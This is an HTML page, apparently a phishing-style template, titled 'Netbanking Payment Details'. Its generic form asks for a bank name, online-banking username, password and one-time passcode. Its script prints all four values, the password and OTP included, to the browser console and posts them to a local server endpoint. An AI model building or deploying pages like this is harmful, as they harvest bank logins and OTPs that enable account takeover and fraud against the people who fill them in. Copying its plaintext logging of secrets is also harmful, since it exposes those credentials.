<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netbanking Payment Details</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            text-align: center;
        }
        .container {
            max-width: 500px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.1);
        }
        h1 {
            margin-bottom: 20px;
        }
        p {
            margin-bottom: 10px;
        }
        input[type="text"],
        input[type="password"],
        input[type="number"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .background-svg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-image: url("https://images.unsplash.com/photo-1564135624576-c5c88640f235?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80");
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
        }
    </style>
</head>
<body>
    <div class="background-svg"></div>
    <div class="container">
        <h1>Netbanking Payment Details</h1>
        <p>Please enter your bank details and proceed:</p>
        <form id="netbanking-payment-form" onsubmit="return submitNetbanking()">
            <input
            type="text"
            id="bank-name"
            name="bank-name"
            placeholder="Bank Name"
            required
            />
            <input
            type="text"
            id="username"
            name="username"
            placeholder="Username"
            required
            />
            <input
            type="password"
            id="password"
            name="password"
            placeholder="Password"
            required
            />
            <input
            type="number"
            id="otp"
            name="otp"
            placeholder="OTP"
            required
            />
            <input type="submit" value="Proceed" />
        </form>
    </div>
    <script>
        function submitNetbanking() {
            const bankName = document.getElementById("bank-name").value;
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const otp = document.getElementById("otp").value;

            console.log("Bank Name:", bankName);
            console.log("Username:", username);
            console.log("Password:", password);
            console.log("OTP:", otp);

            fetch("http://localhost:3000/submit-netbanking", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ bank_name: bankName, username, password, otp }),
            })
            .then((response) => response.text())
            .then((data) => {
                alert(data);
            })
            .catch((error) => {
                console.error("Error:", error);
            });

            return false;
        }
    </script>
</body>
</html>
